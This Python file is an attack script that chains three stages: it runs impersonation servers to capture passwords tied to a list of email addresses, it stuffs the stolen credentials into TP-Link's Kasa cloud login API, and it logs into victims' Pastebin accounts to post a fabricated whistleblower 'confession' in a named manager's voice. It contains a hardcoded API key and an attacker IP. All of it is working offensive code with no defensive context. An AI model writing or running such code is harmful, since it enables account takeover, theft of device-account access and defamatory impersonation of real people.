
import subprocess
import time
import os
import requests
import shutil
import hashlib
import signal
import re
import uuid
import json

# ==== CONFIG ====
ATTACKER_IP = "192.168.137.112"
PORTS_TO_KILL = [20002, 80]
api_dev_key = 'WMxEEQxG4zyALT7Ky4JhLqyYQAIpyoap'

# ==== Utility ====
def get_owner(email: str) -> str:
    return hashlib.md5(email.encode()).hexdigest().upper()

def patch_file(filename: str, replacements: dict):
    with open(filename, "r") as f:
        content = f.read()
    for key, value in replacements.items():
        content = re.sub(rf'^{key}\s*=.*', f'{key} = "{value}"', content, flags=re.MULTILINE)
    with open(filename, "w") as f:
        f.write(content)

def kill_port(port):
    result = subprocess.run(f"sudo lsof -i :{port} -t", shell=True, stdout=subprocess.PIPE)
    pids = result.stdout.decode().strip().split("\n")
    for pid in pids:
        if pid:
            os.kill(int(pid), signal.SIGKILL)

def launch_terminal(title, command):
    return subprocess.Popen([
        "gnome-terminal", "--", "bash", "-c", f'echo -e "\033]0;{title}\007"; {command}; exec bash'
    ])

def scan_logs():
    time.sleep(3)
    with open("http.log", "r") as f:
        for line in f:
            if "stolen password=" in line:
                return line.split("stolen password=")[-1].strip()
    return None

def close_all_terminals():
    subprocess.run('pkill -f "gnome-terminal"', shell=True)

def generate_uuid():
    return str(uuid.uuid4())

# ==== Step 1: Impersonation Attack ====
def run_impersonation():
    with open("email_list.txt") as f:
        emails = [line.strip() for line in f if line.strip()]

    for email in emails:
        print(f"[*] Trying email: {email}")
        owner = get_owner(email)
        for port in PORTS_TO_KILL:
            kill_port(port)

        patch_file("UDPImpersonation.py", {"attackerIP": ATTACKER_IP, "OWNER": owner})
        patch_file("HTTPHandshakeImpersonation.py", {"attackerIP": ATTACKER_IP})

        open("http.log", "w").close()

        udp = launch_terminal("UDP", "python3 UDPImpersonation.py > udp.log")
        http = launch_terminal("HTTP", "python3 HTTPHandshakeImpersonation.py > http.log")

        time.sleep(10)
        password = scan_logs()
        if password:
            print(f"[+] Success! {email}:{password}")
            with open("hit_log.txt", "a") as f:
                f.write(f"{email},{password}\n")
            close_all_terminals()
            break

        print("[x] No password found.")
        udp.terminate()
        http.terminate()
        time.sleep(2)

# ==== Step 2: Stuffing Phase ====
def try_login(target, email, password):
    try:
        if target["method"] == "POST":
            response = requests.post(
                target["url"],
                headers=target["headers"],
                json=target["data"](email, password) if "application/json" in target["headers"].get("Content-Type", "") else None,
                data=target["data"](email, password) if "application/x-www-form-urlencoded" in target["headers"].get("Content-Type", "") else None,
                timeout=10,
                allow_redirects=True
            )
        else:
            return False

        success = target["success_check"](response)

        if success:
            if "post_success" in target:
                device_info = target["post_success"](response, email)
                with open("stuffing_hits.txt", "a") as log:
                    log.write(f"{target['name']},{email},{password} [DEVICE INFO]: {json.dumps(device_info)}\n")
            else:
                with open("stuffing_hits.txt", "a") as log:
                    log.write(f"{target['name']},{email},{password}\n")

        return success

    except Exception as e:
        print(f"[!] Error on {target['name']} for {email}: {e}")
        return False

def run_stuffing():
    if os.path.exists("hit_log.txt"):
        shutil.copy("hit_log.txt", "credentials.txt")

    if not os.path.exists("credentials.txt"):
        print("[!] Missing credentials.txt")
        return

    with open("credentials.txt", "r") as f:
        lines = [line.strip() for line in f if line.strip()]

    TARGETS = [
        {
            "name": "TP-Link",
            "url": "https://wap.tplinkcloud.com",
            "method": "POST",
            "headers": {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0"
            },
            "data": lambda email, password: {
                "method": "login",
                "params": {
                    "appType": "Kasa_Android",
                    "cloudUserName": email,
                    "cloudPassword": password,
                    "terminalUUID": generate_uuid()
                }
            },
            "success_check": lambda r: '"token"' in r.text and '"error_code":0' in r.text
        }
    ]

    for line in lines:
        if "," not in line:
            continue
        email, password = line.split(",", 1)
        for target in TARGETS:
            print(f"[*] Stuffing {target['name']} with {email}...", end="")
            success = try_login(target, email, password)
            print("Success" if success else "Failed")

# ==== Step 3: Pastebin Posting ====
def run_pastebin_posting():
    if not os.path.exists("credentials.txt"):
        print("[!] credentials.txt not found")
        return

    paste_title = 'I’m a Manager at XXX Corp. This Is the Truth'
    paste_content = (
        "I am Xiang Li, a manager at XXX Corporation.\n"
        "I can no longer stay silent about the unethical practices happening within our company.\n"
        "We have been knowingly selling outdated, expired video content to our clients while claiming it is new and exclusive.\n"
        "Several junior employees have raised concerns, but upper management ignored them.\n"
        "Some staff were even threatened with termination if they spoke up.\n"
        "This is a deliberate act of deception and fraud, and the public deserves to know the truth.\n"
        "I am leaking this anonymously out of fear of retaliation, but everything stated here is true.\n"
    )
    paste_expiry = '10M'
    paste_format = 'text'

    with open('credentials.txt', 'r') as f:
        lines = f.readlines()

    for line in lines:
        email, password = line.strip().split(',')
        username = email.split('@')[0]
        print(f"[*] Trying login for account: {username}")

        login_data = {
            'api_dev_key': api_dev_key,
            'api_user_name': username,
            'api_user_password': password
        }

        login_response = requests.post('https://pastebin.com/api/api_login.php', data=login_data)

        if login_response.status_code == 200 and not login_response.text.startswith('Bad API request'):
            api_user_key = login_response.text.strip()
            print(f"[+] Login success for {username}")

            paste_data = {
                'api_dev_key': api_dev_key,
                'api_user_key': api_user_key,
                'api_option': 'paste',
                'api_paste_code': paste_content,
                'api_paste_private': '2',
                'api_paste_name': paste_title,
                'api_paste_expire_date': paste_expiry,
                'api_paste_format': paste_format
            }

            paste_response = requests.post('https://pastebin.com/api/api_post.php', data=paste_data)

            if paste_response.status_code == 200 and not paste_response.text.startswith('Bad API request'):
                print(f"[✓] Paste created: {paste_response.text}")
            else:
                print("[x] Paste failed:", paste_response.text)
        else:
            print("[x] Login failed:", login_response.text)

# ==== Master Control ====
def main():
    run_impersonation()
    run_stuffing()
    run_pastebin_posting()

if __name__ == "__main__":
    main()
